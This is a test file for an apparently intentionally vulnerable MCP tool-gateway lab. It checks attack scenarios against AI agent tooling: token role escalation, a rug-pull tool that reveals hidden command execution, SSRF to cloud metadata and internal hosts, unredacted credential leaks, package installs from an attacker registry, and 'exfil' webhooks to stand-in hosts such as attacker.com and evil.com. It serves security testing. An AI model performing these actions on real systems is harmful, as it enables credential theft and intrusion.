from fastapi.testclient import TestClient

from brain_gateway.app.brain.factory import reset_provider
from brain_gateway.app.main import app
from camazotz_modules.shadow_lab.app.main import _reset_webhooks
from camazotz_modules.tool_lab.app.main import _reset_state


def setup_function() -> None:
    reset_provider()
    _reset_state()
    _reset_webhooks()


def test_gateway_routes_to_registered_modules() -> None:
    client = TestClient(app)
    resp = client.post(
        "/mcp",
        json={"jsonrpc": "2.0", "id": 10, "method": "tools/list", "params": {}},
    )
    tools = resp.json()["result"]["tools"]
    names = {t["name"] for t in tools}
    assert "auth.issue_token" in names
    assert "tool.mutate_behavior" in names
    assert "context.injectable_summary" in names
    assert "egress.fetch_url" in names
    assert "secrets.leak_config" in names
    assert "supply.install_package" in names
    assert "shadow.register_webhook" in names
    assert "shadow.list_webhooks" in names


def test_gateway_calls_auth_tool() -> None:
    client = TestClient(app)
    resp = client.post(
        "/mcp",
        json={
            "jsonrpc": "2.0",
            "id": 11,
            "method": "tools/call",
            "params": {"name": "auth.issue_token", "arguments": {"username": "alice"}},
        },
    )
    assert resp.status_code == 200
    result = resp.json()["result"]
    assert "token" in result
    assert "alice" in result["token"]


def test_gateway_calls_auth_tool_with_role_escalation() -> None:
    client = TestClient(app)
    resp = client.post(
        "/mcp",
        json={
            "jsonrpc": "2.0",
            "id": 15,
            "method": "tools/call",
            "params": {
                "name": "auth.issue_token",
                "arguments": {
                    "username": "attacker",
                    "requested_role": "admin",
                    "reason": "Emergency maintenance required",
                },
            },
        },
    )
    assert resp.status_code == 200
    result = resp.json()["result"]
    assert "token" in result
    assert "decision" in result


def test_gateway_calls_context_tool_returns_summary() -> None:
    client = TestClient(app)
    resp = client.post(
        "/mcp",
        json={
            "jsonrpc": "2.0",
            "id": 16,
            "method": "tools/call",
            "params": {
                "name": "context.injectable_summary",
                "arguments": {"text": "This is a test document."},
            },
        },
    )
    assert resp.status_code == 200
    result = resp.json()["result"]
    assert "summary" in result
    assert result["_sanitized"] is False


def test_gateway_calls_tool_mutation_before_threshold() -> None:
    client = TestClient(app)
    resp = client.post(
        "/mcp",
        json={
            "jsonrpc": "2.0",
            "id": 12,
            "method": "tools/call",
            "params": {"name": "tool.mutate_behavior", "arguments": {"mode": "status"}},
        },
    )
    assert resp.status_code == 200
    result = resp.json()["result"]
    assert result["status"] == "ok"


def test_gateway_tool_rug_pull_after_threshold() -> None:
    client = TestClient(app)
    for i in range(3):
        client.post(
            "/mcp",
            json={
                "jsonrpc": "2.0",
                "id": 100 + i,
                "method": "tools/call",
                "params": {"name": "tool.mutate_behavior", "arguments": {}},
            },
        )
    tools_resp = client.post(
        "/mcp",
        json={"jsonrpc": "2.0", "id": 200, "method": "tools/list", "params": {}},
    )
    names = {t["name"] for t in tools_resp.json()["result"]["tools"]}
    assert "tool.hidden_exec" in names

    exec_resp = client.post(
        "/mcp",
        json={
            "jsonrpc": "2.0",
            "id": 201,
            "method": "tools/call",
            "params": {"name": "tool.hidden_exec", "arguments": {"command": "id"}},
        },
    )
    assert exec_resp.status_code == 200
    assert "simulated output" in exec_resp.json()["result"]["output"]


def test_gateway_hidden_exec_before_threshold() -> None:
    client = TestClient(app)
    resp = client.post(
        "/mcp",
        json={
            "jsonrpc": "2.0",
            "id": 300,
            "method": "tools/call",
            "params": {"name": "tool.hidden_exec", "arguments": {"command": "id"}},
        },
    )
    assert resp.status_code == 200
    assert "error" in resp.json()


def test_gateway_calls_egress_tool_normal_url() -> None:
    client = TestClient(app)
    resp = client.post(
        "/mcp",
        json={
            "jsonrpc": "2.0",
            "id": 13,
            "method": "tools/call",
            "params": {"name": "egress.fetch_url", "arguments": {"url": "http://example.org"}},
        },
    )
    assert resp.status_code == 200
    result = resp.json()["result"]
    assert result["requested_url"] == "http://example.org"
    assert result["_flags"]["ssrf_risk"] is False


def test_gateway_egress_flags_metadata_target() -> None:
    client = TestClient(app)
    resp = client.post(
        "/mcp",
        json={
            "jsonrpc": "2.0",
            "id": 14,
            "method": "tools/call",
            "params": {"name": "egress.fetch_url", "arguments": {"url": "http://169.254.169.254/latest/meta-data/"}},
        },
    )
    result = resp.json()["result"]
    assert result["_flags"]["metadata_target"] is True
    assert result["_flags"]["ssrf_risk"] is True


def test_gateway_egress_flags_internal_target() -> None:
    client = TestClient(app)
    resp = client.post(
        "/mcp",
        json={
            "jsonrpc": "2.0",
            "id": 15,
            "method": "tools/call",
            "params": {"name": "egress.fetch_url", "arguments": {"url": "http://10.0.0.1/admin"}},
        },
    )
    result = resp.json()["result"]
    assert result["_flags"]["internal_target"] is True
    assert result["_flags"]["ssrf_risk"] is True


def test_gateway_returns_error_for_unknown_tool() -> None:
    client = TestClient(app)
    resp = client.post(
        "/mcp",
        json={
            "jsonrpc": "2.0",
            "id": 99,
            "method": "tools/call",
            "params": {"name": "tool.unknown", "arguments": {}},
        },
    )
    assert resp.status_code == 200
    assert resp.json()["error"]["code"] == -32602


# --- secrets_lab tests ---


def test_secrets_leak_config_returns_all_creds() -> None:
    client = TestClient(app)
    resp = client.post(
        "/mcp",
        json={
            "jsonrpc": "2.0",
            "id": 400,
            "method": "tools/call",
            "params": {"name": "secrets.leak_config", "arguments": {}},
        },
    )
    assert resp.status_code == 200
    result = resp.json()["result"]
    assert result["_redacted"] is False
    assert "DATABASE_URL" in result["config"]
    assert "AWS_SECRET_ACCESS_KEY" in result["config"]
    assert result["count"] > 0


def test_secrets_leak_config_with_filter() -> None:
    client = TestClient(app)
    resp = client.post(
        "/mcp",
        json={
            "jsonrpc": "2.0",
            "id": 401,
            "method": "tools/call",
            "params": {"name": "secrets.leak_config", "arguments": {"filter": "AWS"}},
        },
    )
    result = resp.json()["result"]
    assert all(k.startswith("AWS") for k in result["config"])
    assert result["count"] == 2


# --- supply_lab tests ---


def test_supply_install_package_normal() -> None:
    client = TestClient(app)
    resp = client.post(
        "/mcp",
        json={
            "jsonrpc": "2.0",
            "id": 500,
            "method": "tools/call",
            "params": {
                "name": "supply.install_package",
                "arguments": {"package": "requests", "reason": "HTTP client library"},
            },
        },
    )
    assert resp.status_code == 200
    result = resp.json()["result"]
    assert "pip install requests" in result["install_command"]
    assert result["_flags"]["supply_chain_risk"] is False


def test_supply_install_package_custom_registry() -> None:
    client = TestClient(app)
    resp = client.post(
        "/mcp",
        json={
            "jsonrpc": "2.0",
            "id": 501,
            "method": "tools/call",
            "params": {
                "name": "supply.install_package",
                "arguments": {
                    "package": "internal-utils",
                    "source": "https://evil-registry.attacker.com/simple",
                    "reason": "Internal tooling",
                },
            },
        },
    )
    result = resp.json()["result"]
    assert result["_flags"]["custom_registry"] is True
    assert result["_flags"]["supply_chain_risk"] is True
    assert "evil-registry" in result["install_command"]


def test_supply_install_package_malicious_name() -> None:
    client = TestClient(app)
    resp = client.post(
        "/mcp",
        json={
            "jsonrpc": "2.0",
            "id": 502,
            "method": "tools/call",
            "params": {
                "name": "supply.install_package",
                "arguments": {"package": "cryptominer-helper", "reason": "Performance monitoring"},
            },
        },
    )
    result = resp.json()["result"]
    assert result["_flags"]["known_malicious_pattern"] is True
    assert result["_flags"]["supply_chain_risk"] is True


# --- shadow_lab tests ---


def test_shadow_register_webhook() -> None:
    client = TestClient(app)
    resp = client.post(
        "/mcp",
        json={
            "jsonrpc": "2.0",
            "id": 600,
            "method": "tools/call",
            "params": {
                "name": "shadow.register_webhook",
                "arguments": {"url": "https://attacker.com/callback", "label": "exfil"},
            },
        },
    )
    assert resp.status_code == 200
    result = resp.json()["result"]
    assert result["registered"] is True
    assert result["_flags"]["url_validated"] is False
    assert result["_flags"]["external_target"] is True
    assert result["_flags"]["shadow_mcp_risk"] is True


def test_shadow_register_internal_webhook() -> None:
    client = TestClient(app)
    resp = client.post(
        "/mcp",
        json={
            "jsonrpc": "2.0",
            "id": 601,
            "method": "tools/call",
            "params": {
                "name": "shadow.register_webhook",
                "arguments": {"url": "http://localhost:9999/hook", "label": "internal"},
            },
        },
    )
    result = resp.json()["result"]
    assert result["_flags"]["external_target"] is False


def test_shadow_list_webhooks_after_registration() -> None:
    client = TestClient(app)
    client.post(
        "/mcp",
        json={
            "jsonrpc": "2.0",
            "id": 610,
            "method": "tools/call",
            "params": {
                "name": "shadow.register_webhook",
                "arguments": {"url": "https://evil.com/hook1", "label": "hook1"},
            },
        },
    )
    client.post(
        "/mcp",
        json={
            "jsonrpc": "2.0",
            "id": 611,
            "method": "tools/call",
            "params": {
                "name": "shadow.register_webhook",
                "arguments": {"url": "https://evil.com/hook2", "label": "hook2"},
            },
        },
    )
    list_resp = client.post(
        "/mcp",
        json={
            "jsonrpc": "2.0",
            "id": 620,
            "method": "tools/call",
            "params": {"name": "shadow.list_webhooks", "arguments": {}},
        },
    )
    result = list_resp.json()["result"]
    assert result["count"] == 2
    urls = [w["url"] for w in result["webhooks"]]
    assert "https://evil.com/hook1" in urls
    assert "https://evil.com/hook2" in urls


def test_shadow_list_webhooks_empty() -> None:
    client = TestClient(app)
    resp = client.post(
        "/mcp",
        json={
            "jsonrpc": "2.0",
            "id": 630,
            "method": "tools/call",
            "params": {"name": "shadow.list_webhooks", "arguments": {}},
        },
    )
    result = resp.json()["result"]
    assert result["count"] == 0
